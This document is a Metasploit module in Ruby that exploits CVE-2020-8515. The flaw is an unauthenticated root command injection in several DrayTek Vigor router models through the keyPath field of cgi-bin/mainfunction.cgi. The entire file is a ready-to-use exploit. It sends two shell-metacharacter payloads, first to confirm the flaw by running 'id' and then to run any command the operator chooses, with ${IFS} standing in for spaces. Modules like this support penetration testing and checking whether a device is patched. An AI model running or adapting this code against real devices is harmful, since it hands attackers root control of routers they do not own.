##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'DrayTek Vigor Remote Code Execution',
        'Description' => %q(
          DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B
          1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code
          execution as root (without authentication) via shell metacharacters
          to the cgi-bin/mainfunction.cgi URI. This issue has been fixed in
          Vigor3900/2960/300B v1.5.1
        ),
        'Author'      =>
        [
          'mpx0x0', # discovery
          'Juan Escobar <juan[at]null-life.com>', # module development
        ],
        'References'  =>
        [
          [ 'CVE', '2020-8515' ],
          [ 'URL', 'https://www.skullarmy.net/2020/01/draytek-unauthenticated-rce-in-draytek.html' ],
        ],
        'License'     => MSF_LICENSE,
      )
    )
    # set the default command to execute
    register_options(
      [
        OptString.new('CMD', [true, 'Command to execute', 'ifconfig']),
      ], self.class
    )
  end

  def check
    uri = target_uri.path
    payload1 = "login%22%3bid%3b%22"
    payload2 = "login%27%0Aid%0A%27"

    res = send_request_cgi(
      'uri'    => normalize_uri(uri, 'cgi-bin', 'mainfunction.cgi'),
      'method' => 'POST'
    )

    if res && res.code == 200
      print_status('Site is alive')
    else
      return Exploit::CheckCode::Safe
    end

    data = "action=login&keyPath=#{ payload1 }&loginUser=oXt1j+Qk69M/KpfKucK3XqWMriH44U5pyNp2vVRvBPVOnUsiHudTzE4t5NOPuJbjZ3enHKAtx5TkgdOYEeJTsA==&loginPwd=UiDzE1ghmBA2siVClwRuCahfq2E50BhdFsxJk3yNQxTbqmZIAUwspiGJM4NXGRcbtiQvqMhotC4pXTJItBBesQ==&formcaptcha=bnVsbA==&rtick=null"

    res = send_request_cgi(
      'uri' => normalize_uri(uri, 'cgi-bin', 'mainfunction.cgi'),
      'method' => 'POST',
      'data' => data
    )

    print_status('Trying payload #1')

    if res && res.code == 200 and res.body =~ /root/
      return Exploit::CheckCode::Vulnerable
    end

    data = "action=login&keyPath=#{ payload2 }&loginUser=oXt1j+Qk69M/KpfKucK3XqWMriH44U5pyNp2vVRvBPVOnUsiHudTzE4t5NOPuJbjZ3enHKAtx5TkgdOYEeJTsA==&loginPwd=UiDzE1ghmBA2siVClwRuCahfq2E50BhdFsxJk3yNQxTbqmZIAUwspiGJM4NXGRcbtiQvqMhotC4pXTJItBBesQ==&formcaptcha=bnVsbA==&rtick=null"

    res = send_request_cgi(
      'uri' => normalize_uri(uri, 'cgi-bin', 'mainfunction.cgi'),
      'method' => 'POST',
      'data' => data
    )

    print_status('Trying payload #2')

    if res && res.code == 200 and res.body =~ /root/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe

  end


  def run
    uri = target_uri.path
    cmd = datastore['CMD'].gsub(/ /, "${IFS}") # 0XSHA fix
    payload1 = "login%22%3b#{ cmd }%3b%22"
    payload2 = "login%27%0A#{ cmd }%0A%27"

    res = send_request_cgi(
      'uri'    => normalize_uri(uri, 'cgi-bin', 'mainfunction.cgi'),
      'method' => 'POST'
    )

    if res && res.code == 200
      print_status('Site is alive')
    else
      return Exploit::CheckCode::Safe
    end

    data = "action=login&keyPath=#{ payload1 }&loginUser=oXt1j+Qk69M/KpfKucK3XqWMriH44U5pyNp2vVRvBPVOnUsiHudTzE4t5NOPuJbjZ3enHKAtx5TkgdOYEeJTsA==&loginPwd=UiDzE1ghmBA2siVClwRuCahfq2E50BhdFsxJk3yNQxTbqmZIAUwspiGJM4NXGRcbtiQvqMhotC4pXTJItBBesQ==&formcaptcha=bnVsbA==&rtick=null"

    res = send_request_cgi(
      'uri'    => normalize_uri(uri, 'cgi-bin', 'mainfunction.cgi'),
      'method' => 'POST',
      'data'   => data
    )

    print_status('Trying payload #1')

    if res && res.code == 200 and res.body.length > 3
      print_status("Response:\r\n#{ res.body }")
      return Exploit::CheckCode::Vulnerable
    end

    data = "action=login&keyPath=#{ payload2 }&loginUser=oXt1j+Qk69M/KpfKucK3XqWMriH44U5pyNp2vVRvBPVOnUsiHudTzE4t5NOPuJbjZ3enHKAtx5TkgdOYEeJTsA==&loginPwd=UiDzE1ghmBA2siVClwRuCahfq2E50BhdFsxJk3yNQxTbqmZIAUwspiGJM4NXGRcbtiQvqMhotC4pXTJItBBesQ==&formcaptcha=bnVsbA==&rtick=null"

    res = send_request_cgi(
      'uri'    => normalize_uri(uri, 'cgi-bin', 'mainfunction.cgi'),
      'method' => 'POST',
      'data'   => data
    )

    print_status('Trying payload #2')

    if res && res.code == 200 and res.body.length > 3
      print_status("Response:\r\n#{ res.body }")
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe

  end

end
